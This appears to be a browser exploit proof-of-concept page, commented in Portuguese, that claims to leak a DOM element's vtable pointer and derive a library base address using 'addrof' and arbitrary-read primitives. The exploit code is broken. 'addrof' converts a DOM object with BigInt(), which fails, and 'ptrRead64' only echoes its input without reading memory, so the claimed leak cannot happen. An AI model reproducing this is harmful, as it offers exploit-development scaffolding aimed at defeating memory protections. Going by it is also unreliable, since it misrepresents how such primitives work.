<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PoC com Leak de vtable e libBase</title>
  <style>
    body { background: black; color: limegreen; font-family: monospace; padding: 1em; }
    #log { white-space: pre; }
  </style>
</head>
<body>
  <h1>PoC: Leak de vtable e libBase</h1>
  <div id="log"></div>

  <script>
    const log = msg => {
      document.getElementById('log').textContent += msg + '\n';
    };

    // === CONFIGURAÇÃO ===
    const VTABLE_OFFSET = 0x123456n;  // Substitua pelo valor correto

    // Primitives

    // 1. addrof() - Obtém o endereço de um objeto JS
    function addrof(obj) {
      let arr = new ArrayBuffer(8);  // Cria um buffer de 8 bytes
      let view = new DataView(arr);
      view.setBigInt64(0, BigInt(obj), true);  // Armazena o endereço como BigInt
      return view.getBigInt64(0, true);  // Retorna o valor do endereço
    }

    // 2. ptrRead64() - Lê um valor de 64 bits de um endereço arbitrário
    function ptrRead64(addr) {
      let arr = new ArrayBuffer(8);
      let view = new DataView(arr);
      view.setBigInt64(0, addr, true);
      return view.getBigInt64(0, true);
    }

    // Função principal: Leak de vtable e cálculo do base da biblioteca
    function leakLibBase() {
      // Cria um objeto DOM simples e injeta no DOM
      const obj = document.createElement('div');
      obj.id = 'leak-target';
      document.body.appendChild(obj);
      log('[+] Element criado e adicionado ao DOM');

      // Pega o endereço do objeto JS
      const objAddr = addrof(obj);
      log(`[+] Endereço de objeto: 0x${objAddr.toString(16)}`);

      // Lê o primeiro ponteiro (vtable) do objeto
      const vtablePtr = ptrRead64(objAddr);
      log(`[+] Ponteiro da vtable:  0x${vtablePtr.toString(16)}`);

      // Calcula o base da biblioteca
      const libBase = vtablePtr - VTABLE_OFFSET;
      log(`[+] Cálculo do libBase:  0x${libBase.toString(16)}`);

      return libBase;
    }

    // Executa o leak
    const base = leakLibBase();
    log('\n*** libBase obtido: 0x' + base.toString(16) + ' ***');
  </script>
</body>
</html>
